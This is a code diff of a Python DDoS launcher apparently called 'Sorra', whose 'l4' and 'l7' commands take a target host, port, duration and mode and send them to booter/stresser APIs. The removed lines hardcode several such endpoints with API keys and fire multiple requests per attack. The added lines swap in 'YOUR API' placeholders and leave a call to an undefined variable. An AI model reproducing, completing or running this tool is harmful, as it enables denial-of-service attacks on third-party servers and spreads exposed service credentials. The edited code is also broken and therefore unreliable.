@@ -40,27 +40,15 @@ def take_commands():
         port = input(" Port:")
         time = input(" Time:")
         mode = input(" Mode:")
-        api1 = "http://api.pia.uy/api/attacks?host=" + host + "&method=" + mode + "&port=" + port +"&time=" + time + "&apikey=rookie:fl698t8ylc"
-        api2 = "http://api.pia.uy/api/attacks?host=" + host + "&method=plain&port=" + port +"&time=" + time + "&apikey=rookie:fl698t8ylc"
-        api3 = "https://api.securestress.pw/l4.php?key=Rleh0pQkHuvmO2Z9&attackid=[attackid]&host=" + host +"&port=" + port +"&time=" +time + "&mode=" + mode
-        api4 = "https://api.securestress.pw/l4.php?key=Rleh0pQkHuvmO2Z9&attackid=[attackid]&host=" + host +"&port=" + port +"&time=" +time + "&mode=" + mode
-        api5 = "https://api.securestress.pw/l4.php?key=Rleh0pQkHuvmO2Z9&attackid=[attackid]&host=" + host +"&port=" + port +"&time=" +time + "&mode=XMAS"
+        api1 = "YOUR API" + host + "" + mode + "" + port +"" + time + ""
         r = requests.get(api1)
-        r2 = requests.get(api2)
-        r3 = requests.get(api3)
-        r4 = requests.get(api4)
-        r5 = requests.get(api5)
         print(Fore.CYAN +" Flood Brodcasted To Servers.")
     if command == "l7":
         host = input("[Sorra ~] host:")
         time = input("[Sorra ~] Time:")
         mode = input("[Sorra ~] Mode:")
-        api6 = "https://api.securestress.pw/l7.php?key=Rleh0pQkHuvmO2Z9&attackid=[attackid]&host=" +host + "&time=" + time + "&mode=" + mode + "&method=[method]&ratelimit=[ratelimit]&body=[body]&cookie=[cookie]"
-        api7 = "https://api.securestress.pw/l7.php?key=Rleh0pQkHuvmO2Z9&attackid=[attackid]&host=" +host + "&time=" + time + "&mode=HTTP-BASIC&method=[method]&ratelimit=[ratelimit]&body=[body]&cookie=[cookie]"
-        api8 = "https://api.securestress.pw/l7.php?key=Rleh0pQkHuvmO2Z9&attackid=[attackid]&host=" +host + "&time=" + time + "&mode=HTTP-BASIC&method=[method]&ratelimit=[ratelimit]&body=[body]&cookie=[cookie]"
-        r6 = requests.get(api6)
-        r7 = requests.get(api7)
-        r8 = requests.get(api8)
+        api2 = "YOUR API" +host + "" + time + "" + mode + ""
+        r2 = requests.get(api6)
         print(Fore.CYAN +" Flood Brodcasted To Servers.")
     if command == "stop":
         print(Fore.CYAN +" Flood Successfully Stopped.")
